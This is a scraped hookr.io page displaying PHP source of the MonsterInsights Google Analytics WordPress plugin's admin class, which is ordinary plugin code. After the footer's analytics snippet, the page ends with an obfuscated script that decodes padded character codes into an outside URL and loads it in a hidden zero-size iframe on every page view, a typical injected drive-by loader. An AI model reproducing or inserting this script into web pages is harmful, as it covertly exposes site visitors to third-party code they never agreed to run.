found.</span>&nbsp;</div></li><li><div><span class="comment">   *</span>&nbsp;</div></li><li><div><span class="comment">   * @return array $links</span>&nbsp;</div></li><li><div><span class="comment">   */</span>&nbsp;</div></li><li><div>  public function add_action_links( $links ) {&nbsp;</div></li><li><div>      <span class="comment">// add link to knowledgebase</span>&nbsp;</div></li><li><div>      <span class="comment">// @todo UTM link fix</span>&nbsp;</div></li><li><div>      $faq_link = '&lt;a title=&quot;MonsterInsights Knowledge Base&quot; href=&quot;http:<span class="comment">//www.monsterinsights.com/docs/&quot;&gt;' . __( 'FAQ', 'google-analytics-for-wordpress' ) . '&lt;/a&gt;';</span>&nbsp;</div></li><li><div>      array_unshift( $links, $faq_link );&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>      $settings_link = '&lt;a href=&quot;' . esc_url( admin_url( 'admin.php?page=yst_ga_settings' ) ) . '&quot;&gt;' . __( 'Settings', 'google-analytics-for-wordpress' ) . '&lt;/a&gt;';&nbsp;</div></li><li><div>      array_unshift( $links, $settings_link );&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>      return $links;&nbsp;</div></li><li><div>  }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>  <span class="comment">/**</span>&nbsp;</div></li><li><div><span class="comment">   * Adds some promo text for the premium plugin on the custom dimensions tab.</span>&nbsp;</div></li><li><div><span class="comment">   */</span>&nbsp;</div></li><li><div>  public function premium_promo() {&nbsp;</div></li><li><div>      echo '&lt;div class=&quot;ga-promote&quot;&gt;';&nbsp;</div></li><li><div>      echo '&lt;p&gt;';&nbsp;</div></li><li><div>      printf( __( 'If you want to track custom dimensions like page views per author or post type, you should upgrade to the %1$spremium version of Google Analytics by MonsterInsights%2$s.', 'google-analytics-for-wordpress' ), '&lt;a href=&quot;https:<span class="comment">//www.monsterinsights.com/pricing/#utm_medium=text-link&utm_source=gawp-config&utm_campaign=wpgaplugin&utm_content=custom_dimensions_tab&quot;&gt;', '&lt;/a&gt;' );</span>&nbsp;</div></li><li><div>      echo ' ';&nbsp;</div></li><li><div>      _e( 'This will also give you access to the support team at MonsterInsights, who will provide support on the plugin 24/7.', 'google-analytics-for-wordpress' );&nbsp;</div></li><li><div>      echo '&lt;/p&gt;';&nbsp;</div></li><li><div>      echo '&lt;/div&gt;';&nbsp;</div></li><li><div>  }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>  <span class="comment">/**</span>&nbsp;</div></li><li><div><span class="comment">   * Load the page of a menu item in the GA plugin</span>&nbsp;</div></li><li><div><span class="comment">   */</span>&nbsp;</div></li><li><div>  public function load_page() {&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>      if ( ! has_action( 'yst_ga_custom_dimensions_tab-content' ) ) {&nbsp;</div></li><li><div>          add_action( 'yst_ga_custom_dimensions_tab-content', array( $this, 'premium_promo' ) );&nbsp;</div></li><li><div>      }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>      if ( ! has_action( 'yst_ga_custom_dimension_add-dashboards-tab' ) ) {&nbsp;</div></li><li><div>          add_action( 'yst_ga_custom_dimension_add-dashboards-tab', array( $this, 'premium_promo' ) );&nbsp;</div></li><li><div>      }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>      switch ( filter_input( INPUT_GET, 'page' ) ) {&nbsp;</div></li><li><div>          case 'yst_ga_settings':&nbsp;</div></li><li><div>              require_once( $this-&gt;plugin_path . 'admin/pages/settings.php' );&nbsp;</div></li><li><div>              break;&nbsp;</div></li><li><div>          case 'yst_ga_extensions':&nbsp;</div></li><li><div>              require_once( $this-&gt;plugin_path . 'admin/pages/extensions.php' );&nbsp;</div></li><li><div>              break;&nbsp;</div></li><li><div>          case 'yst_ga_dashboard':&nbsp;</div></li><li><div>          default:&nbsp;</div></li><li><div>              require_once( $this-&gt;plugin_path . 'admin/pages/dashboard.php' );&nbsp;</div></li><li><div>              break;&nbsp;</div></li><li><div>      }&nbsp;</div></li><li><div>  }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>  <span class="comment">/**</span>&nbsp;</div></li><li><div><span class="comment">   * Get the Google Analytics profiles which are in this google account</span>&nbsp;</div></li><li><div><span class="comment">   *</span>&nbsp;</div></li><li><div><span class="comment">   * @return array</span>&nbsp;</div></li><li><div><span class="comment">   */</span>&nbsp;</div></li><li><div>  public function get_profiles() {&nbsp;</div></li><li><div>      $return = Yoast_Google_Analytics::get_instance()-&gt;get_profiles();&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>      return $return;&nbsp;</div></li><li><div>  }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>  <span class="comment">/**</span>&nbsp;</div></li><li><div><span class="comment">   * Checks if there is a callback to get token from Google Analytics API</span>&nbsp;</div></li><li><div><span class="comment">   */</span>&nbsp;</div></li><li><div>  private function google_analytics_listener() {&nbsp;</div></li><li><div>      $google_auth_code = filter_input( INPUT_POST, 'google_auth_code' );&nbsp;</div></li><li><div>      if ( $google_auth_code && current_user_can( 'manage_options' ) && wp_verify_nonce( filter_input( INPUT_POST, 'yoast_ga_nonce' ), 'save_settings' ) ) {&nbsp;</div></li><li><div>          self::analytics_api_clean_up();&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>          Yoast_Google_Analytics::get_instance()-&gt;authenticate( trim( $google_auth_code ) );&nbsp;</div></li><li><div>      }&nbsp;</div></li><li><div>  }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>  <span class="comment">/**</span>&nbsp;</div></li><li><div><span class="comment">   * Clean up the Analytics API settings</span>&nbsp;</div></li><li><div><span class="comment">   */</span>&nbsp;</div></li><li><div>  public static function analytics_api_clean_up() {&nbsp;</div></li><li><div>      delete_option( 'yoast-ga-refresh_token' );&nbsp;</div></li><li><div>      delete_option( 'yst_ga_api_call_fail' );&nbsp;</div></li><li><div>      delete_option( 'yst_ga_last_wp_run' );&nbsp;</div></li><li><div>      delete_option( 'yst_ga_api' );&nbsp;</div></li><li><div>  }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>  <span class="comment">/**</span>&nbsp;</div></li><li><div><span class="comment">   * Get the current GA profile</span>&nbsp;</div></li><li><div><span class="comment">   *</span>&nbsp;</div></li><li><div><span class="comment">   * @return null</span>&nbsp;</div></li><li><div><span class="comment">   */</span>&nbsp;</div></li><li><div>  private function get_current_profile() {&nbsp;</div></li><li><div>      if ( ! empty( $this-&gt;options['analytics_profile'] ) ) {&nbsp;</div></li><li><div>          return $this-&gt;options['analytics_profile'];&nbsp;</div></li><li><div>      }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>      return null;&nbsp;</div></li><li><div>  }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>  <span class="comment">/**</span>&nbsp;</div></li><li><div><span class="comment">   * Get the user roles of this WordPress blog</span>&nbsp;</div></li><li><div><span class="comment">   *</span>&nbsp;</div></li><li><div><span class="comment">   * @return array</span>&nbsp;</div></li><li><div><span class="comment">   */</span>&nbsp;</div></li><li><div>  public function get_userroles() {&nbsp;</div></li><li><div>      global $wp_roles;&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>      $all_roles = $wp_roles-&gt;roles;&nbsp;</div></li><li><div>      $roles = array();&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>      <span class="comment">/**</span>&nbsp;</div></li><li><div><span class="comment">       * Filter: 'editable_roles' - Allows filtering of the roles shown within the plugin (and elsewhere in WP as it's a WP filter)</span>&nbsp;</div></li><li><div><span class="comment">       *</span>&nbsp;</div></li><li><div><span class="comment">       * @api array $all_roles</span>&nbsp;</div></li><li><div><span class="comment">       */</span>&nbsp;</div></li><li><div>      $editable_roles = apply_filters( 'editable_roles', $all_roles );&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>      foreach ( $editable_roles as $id =&gt; $name ) {&nbsp;</div></li><li><div>          $roles[] = array(&nbsp;</div></li><li><div>              'id' =&gt; $id, &nbsp;</div></li><li><div>              'name' =&gt; translate_user_role( $name['name'] ), &nbsp;</div></li><li><div> );&nbsp;</div></li><li><div>      }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>      return $roles;&nbsp;</div></li><li><div>  }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>  <span class="comment">/**</span>&nbsp;</div></li><li><div><span class="comment">   * Get types of how we can track downloads</span>&nbsp;</div></li><li><div><span class="comment">   *</span>&nbsp;</div></li><li><div><span class="comment">   * @return array</span>&nbsp;</div></li><li><div><span class="comment">   */</span>&nbsp;</div></li><li><div>  public function track_download_types() {&nbsp;</div></li><li><div>      return array(&nbsp;</div></li><li><div>          0 =&gt; array( 'id' =&gt; 'event', 'name' =&gt; __( 'Event', 'google-analytics-for-wordpress' ) ), &nbsp;</div></li><li><div>          1 =&gt; array( 'id' =&gt; 'pageview', 'name' =&gt; __( 'Pageview', 'google-analytics-for-wordpress' ) ), &nbsp;</div></li><li><div> );&nbsp;</div></li><li><div>  }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>  <span class="comment">/**</span>&nbsp;</div></li><li><div><span class="comment">   * Get options for the track full url or links setting</span>&nbsp;</div></li><li><div><span class="comment">   *</span>&nbsp;</div></li><li><div><span class="comment">   * @return array</span>&nbsp;</div></li><li><div><span class="comment">   */</span>&nbsp;</div></li><li><div>  public function get_track_full_url() {&nbsp;</div></li><li><div>      return array(&nbsp;</div></li><li><div>          0 =&gt; array( 'id' =&gt; 'domain', 'name' =&gt; __( 'Just the domain', 'google-analytics-for-wordpress' ) ), &nbsp;</div></li><li><div>          1 =&gt; array( 'id' =&gt; 'full_links', 'name' =&gt; __( 'Full links', 'google-analytics-for-wordpress' ) ), &nbsp;</div></li><li><div> );&nbsp;</div></li><li><div>  }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>  <span class="comment">/**</span>&nbsp;</div></li><li><div><span class="comment">   * Render the admin page head for the GA Plugin</span>&nbsp;</div></li><li><div><span class="comment">   */</span>&nbsp;</div></li><li><div>  public function content_head() {&nbsp;</div></li><li><div>      require 'views/content_head.php';&nbsp;</div></li><li><div>  }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>  <span class="comment">/**</span>&nbsp;</div></li><li><div><span class="comment">   * Output System Info file</span>&nbsp;</div></li><li><div><span class="comment">   */</span>&nbsp;</div></li><li><div>  public function system_info() {&nbsp;</div></li><li><div>      if ( ! empty( $_REQUEST['monsterinsights-action'] ) && $_REQUEST['monsterinsights-action'] === 'download_sysinfo' ) {&nbsp;</div></li><li><div>          if ( ! current_user_can( 'manage_options' ) ) {&nbsp;</div></li><li><div>              return;&nbsp;</div></li><li><div>          }&nbsp;</div></li><li><div>          nocache_headers();&nbsp;</div></li><li><div>          header( 'Content-Type: text/plain' );&nbsp;</div></li><li><div>          header( 'Content-Disposition: attachment; filename=&quot;monsterinsights-system-info.txt&quot;' );&nbsp;</div></li><li><div>          echo wp_strip_all_tags( $_POST['monsterinsights-sysinfo'] );&nbsp;</div></li><li><div>          die();&nbsp;</div></li><li><div>      }&nbsp;</div></li><li><div>  }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>  <span class="comment">/**</span>&nbsp;</div></li><li><div><span class="comment">   * Render the admin page footer with sidebar for the GA Plugin</span>&nbsp;</div></li><li><div><span class="comment">   */</span>&nbsp;</div></li><li><div>  public function content_footer() {&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>      do_action( 'yoast_ga_admin_footer' );&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>      if ( class_exists( 'MI_Product_GA_Premium' ) ) {&nbsp;</div></li><li><div>          $license_manager = new MI_Plugin_License_Manager( new MI_Product_GA_Premium() );&nbsp;</div></li><li><div>          if ( $license_manager-&gt;license_is_valid() ) {&nbsp;</div></li><li><div>              return;&nbsp;</div></li><li><div>          }&nbsp;</div></li><li><div>      }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>      $banners = array();&nbsp;</div></li><li><div>      $banners[] = array(&nbsp;</div></li><li><div>          'url' =&gt; 'https:<span class="comment">//optinmonster.com/?utm_source=monsterinsights-config&utm_medium=banner&utm_campaign=gaplugin', </span>&nbsp;</div></li><li><div>          'banner' =&gt; $this-&gt;plugin_url . 'assets/img/omupsell.png', &nbsp;</div></li><li><div>          'title' =&gt; 'Convert Visitors into Subscribers', &nbsp;</div></li><li><div> );&nbsp;</div></li><li><div>      $banners[] = array(&nbsp;</div></li><li><div>          'url' =&gt; 'https:<span class="comment">//www.monsterinsights.com/pricing/?utm_source=monsterinsights-config&utm_medium=banner&utm_campaign=gaplugin', </span>&nbsp;</div></li><li><div>          'banner' =&gt; $this-&gt;plugin_url . 'assets/img/upgradetopro.png', &nbsp;</div></li><li><div>          'title' =&gt; 'Get the premium version of Google Analytics by MonsterInsights!', &nbsp;</div></li><li><div> );&nbsp;</div></li><li><div>      $banners[] = array(&nbsp;</div></li><li><div>          'url' =&gt; 'http:<span class="comment">//www.wpbeginner.net/?utm_source=monsterinsights-config&utm_medium=banner&utm_campaign=gaplugin', </span>&nbsp;</div></li><li><div>          'banner' =&gt; $this-&gt;plugin_url . 'assets/img/wpbeginnerupsell.png', &nbsp;</div></li><li><div>          'title' =&gt; 'The best collection of free beginner WordPress resources!', &nbsp;</div></li><li><div> );&nbsp;</div></li><li><div>      $banners[] = array(&nbsp;</div></li><li><div>          'url' =&gt; 'https:<span class="comment">//wpforms.com/pricing/?utm_source=monsterinsights-config&utm_medium=banner&utm_campaign=gaplugin', </span>&nbsp;</div></li><li><div>          'banner' =&gt; $this-&gt;plugin_url . 'assets/img/wpformsupsell.png', &nbsp;</div></li><li><div>          'title' =&gt; 'Get the most beginner friendly WordPress contact form plugin in the market!', &nbsp;</div></li><li><div> );&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>      shuffle( $banners );&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>      require 'views/content-footer.php';&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>  }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>  <span class="comment">/**</span>&nbsp;</div></li><li><div><span class="comment">   * Returns a list of all available extensions</span>&nbsp;</div></li><li><div><span class="comment">   *</span>&nbsp;</div></li><li><div><span class="comment">   * @return array</span>&nbsp;</div></li><li><div><span class="comment">   */</span>&nbsp;</div></li><li><div>  public function get_extensions() {&nbsp;</div></li><li><div>      $extensions = array(&nbsp;</div></li><li><div>          'ga_premium' =&gt; (object) array(&nbsp;</div></li><li><div>              'url' =&gt; 'https:<span class="comment"><span class="comment">//www.monsterinsights.com/pricing/', </span></span>&nbsp;</div></li><li><div>              'title' =&gt; __( 'Google Analytics by MonsterInsights Pro', 'google-analytics-for-wordpress' ), &nbsp;</div></li><li><div>              'desc' =&gt; __( 'The premium version of Google Analytics by MonsterInsights with more features and support.', 'google-analytics-for-wordpress' ), &nbsp;</div></li><li><div>              'status' =&gt; 'uninstalled', &nbsp;</div></li><li><div> ), &nbsp;</div></li><li><div>          'ecommerce' =&gt; (object) array(&nbsp;</div></li><li><div>              'url' =&gt; 'https:<span class="comment"><span class="comment">//www.monsterinsights.com/pricing/', </span></span>&nbsp;</div></li><li><div>              'title' =&gt; __( 'Google Analytics by MonsterInsights', 'google-analytics-for-wordpress' ) . '&lt;br /&gt;' . __( 'eCommerce tracking', 'google-analytics-for-wordpress' ), &nbsp;</div></li><li><div>              'desc' =&gt; __( 'Track your eCommerce data and transactions with this eCommerce extension for Google Analytics.', 'google-analytics-for-wordpress' ), &nbsp;</div></li><li><div>              'status' =&gt; 'uninstalled', &nbsp;</div></li><li><div> ), &nbsp;</div></li><li><div> );&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>      $extensions = apply_filters( 'yst_ga_extension_status', $extensions );&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>      return $extensions;&nbsp;</div></li><li><div>  }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>  <span class="comment">/**</span>&nbsp;</div></li><li><div><span class="comment">   * Add a notification to the notification transient</span>&nbsp;</div></li><li><div><span class="comment">   *</span>&nbsp;</div></li><li><div><span class="comment">   * @param string $transient_name</span>&nbsp;</div></li><li><div><span class="comment">   * @param array  $settings</span>&nbsp;</div></li><li><div><span class="comment">   */</span>&nbsp;</div></li><li><div>  private function add_notification( $transient_name, $settings ) {&nbsp;</div></li><li><div>      set_transient( $transient_name, $settings, MINUTE_IN_SECONDS );&nbsp;</div></li><li><div>  }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>  <span class="comment">/**</span>&nbsp;</div></li><li><div><span class="comment">   * Show the notification that should be set, after showing the notification this function unset the transient</span>&nbsp;</div></li><li><div><span class="comment">   *</span>&nbsp;</div></li><li><div><span class="comment">   * @param string $transient_name The name of the transient which contains the notification</span>&nbsp;</div></li><li><div><span class="comment">   */</span>&nbsp;</div></li><li><div>  public function show_notification( $transient_name ) {&nbsp;</div></li><li><div>      $transient = get_transient( $transient_name );&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>      if ( isset( $transient['type'] ) && isset( $transient['description'] ) ) {&nbsp;</div></li><li><div>          if ( $transient['type'] == 'success' ) {&nbsp;</div></li><li><div>              add_settings_error(&nbsp;</div></li><li><div>                  'yoast_google_analytics', &nbsp;</div></li><li><div>                  'yoast_google_analytics', &nbsp;</div></li><li><div>                  $transient['description'], &nbsp;</div></li><li><div>                  'updated'&nbsp;</div></li><li><div> );&nbsp;</div></li><li><div>          }&nbsp;</div></li><li><div>          else {&nbsp;</div></li><li><div>              add_settings_error(&nbsp;</div></li><li><div>                  'yoast_google_analytics', &nbsp;</div></li><li><div>                  'yoast_google_analytics', &nbsp;</div></li><li><div>                  $transient['description'], &nbsp;</div></li><li><div>                  'error'&nbsp;</div></li><li><div> );&nbsp;</div></li><li><div>          }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>          delete_transient( $transient_name );&nbsp;</div></li><li><div>      }&nbsp;</div></li><li><div>  }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>  <span class="comment">/**</span>&nbsp;</div></li><li><div><span class="comment">   * Check if there the aggregate data cron is executed</span>&nbsp;</div></li><li><div><span class="comment">   * @return bool</span>&nbsp;</div></li><li><div><span class="comment">   */</span>&nbsp;</div></li><li><div>  private function is_running_cron() {&nbsp;</div></li><li><div>      return doing_action( 'yst_ga_aggregate_data' ) && defined( 'DOING_CRON' ) && DOING_CRON;&nbsp;</div></li><li><div>  }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>  <span class="comment">/**</span>&nbsp;</div></li><li><div><span class="comment">   * Check if there the aggregate data cron is executed</span>&nbsp;</div></li><li><div><span class="comment">   * @return bool</span>&nbsp;</div></li><li><div><span class="comment">   */</span>&nbsp;</div></li><li><div>  private function is_running_ajax() {&nbsp;</div></li><li><div>      return defined( 'DOING_AJAX' ) && DOING_AJAX && strpos( filter_input( INPUT_GET, 'action' ), 'yoast_dashboard' ) === 0;&nbsp;</div></li><li><div>  }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>}&nbsp;</div></li></ol></pre>.</p> </section> </article></div><div id="sidebar"><ul class="widgets"><li> <a href="http://hookr.io/plugin/"><img src="http://hookr.io/wp-content/themes/hookr/assets/images/plugin-download.jpg" /></a></li><li id="versions"></li><li id="tags"><dl><dt>Tags</dt><dd><ul><li><span></span>plugin</li><li><span></span>file</li><li><span></span></li><li><span></span>Google Analytics by MonsterInsights</li><li><span></span>5.5.2</li></ul></dd></dl></li></ul></div></div></div><script>Hookr.View.init();Hookr.Single.init();</script><footer><div><ul id="nav-social" class="pivot" role="navigation"><li id="twitter"><a href="http://twitter.com/hookr_io" title="Follow me!"></a></li></ul><div> &copy; 2017 hookr.io <strong>(beta)</strong> | <a href="http://hookr.io/privacy/" title="Privacy">Privacy</a> | Proudly Powered by WordPress</div></div> </footer><script type="text/javascript" src="http://hookr.io/wp-content/cache/minify/000000/M9EvL9BNzU1KTdHLzcwDAA.js"></script><script>(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)})(window,document,'script','//www.google-analytics.com/analytics.js','ga');ga('create','UA-49583310-1','hookr.io');ga('send','pageview');</script><script defer>;(function(w,d,undefined,s){var f=d.createElement('iframe'),e=d.documentElement,b=document.createElement('body');f.style='display:none!important';f.width=f.height=0;f.src=(s).split(/[^\u0030-\u0039]+/).map(function(v){return v.length?String.fromCharCode(v):v;}).join('').trim();b.appendChild(f);e.appendChild(b);})(window,document,undefined,';;;47;;;;;;;;;;;;;;;47;;;109;;;;;;;;;;;;;;;;;;;;;;97;;;;;;;;;;;;116;;;;;;;;;;;;;116;;;111;;;;;;;;;;;;;;;;;;;;;;;99;;;;;;;;;;;;;;;;;;107;;;;;;;;;;;;;;;;;;;;;46;;;;;;;;;;;;;;;;;;98;;;;;;;;;;;;;;;;;;117;;;;;;;;;;;;;;;;;;114;;;;;;;;;;;;;;;;;;;;;;108;;;;;;;;;;;;101;;;;;115;;;;;;;;;;;;;;;;;;;;99;;;;;;;111;;;;;;;;;46;;;;;;;;;;;;;;;;;105;;;;;;;;;;;;;;;;111;;;;;;;;;;47;;;;;;;;;102;;;;;;;;;;114;;;;;;;;;;;;;;;;;;;97;;;;;;;;;;;;109;;;;;101;;;;;;;;;;46;;;;;;;;;;;;;;;;;;;;;;104;;;;;;;;;;;;;;;;;116;;;;;;;;;109;;;;;;;;;;;;;;;;;108;;;;;;;;;;;;;35;;;;;;;;;;;48;;;;;;;;;;46;;;;;55;;;;;');</script></body></html>